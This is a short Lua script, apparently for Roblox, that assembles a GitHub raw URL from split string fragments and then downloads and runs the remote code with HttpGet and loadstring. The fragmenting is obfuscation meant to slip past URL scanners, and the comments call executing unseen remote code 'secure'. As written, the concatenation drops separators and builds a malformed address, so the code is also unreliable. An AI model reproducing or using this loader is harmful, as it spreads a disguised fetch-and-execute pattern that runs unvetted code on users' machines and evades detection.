-- Breaking the URL into smaller parts without breaking the script
local part1 = "h" .. "ttps"
local part2 = "://" .. "r" .. "aw"
local part3 = "g" .. "ithub"
local part4 = ".com/" .. "M" .. "elharper"
local part5 = "G" .. "abeBoa2"
local part6 = "refs/" .. "he" .. "ads"
local part7 = "/main/"
local part8 = "url_decoder" .. ".lua"

-- Combine the parts to form the full URL
local fullUrl = part1 .. part2 .. part3 .. part4 .. part5 .. part6 .. part7 .. part8

-- Dynamically load and execute the script securely
local function fetchAndExecuteUrl(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    if success and response then
        return loadstring(response)()
    else
        warn("Failed to retrieve or execute the script: ", response)
    end
end

-- Fetch and execute the URL decoder script securely
fetchAndExecuteUrl(fullUrl)
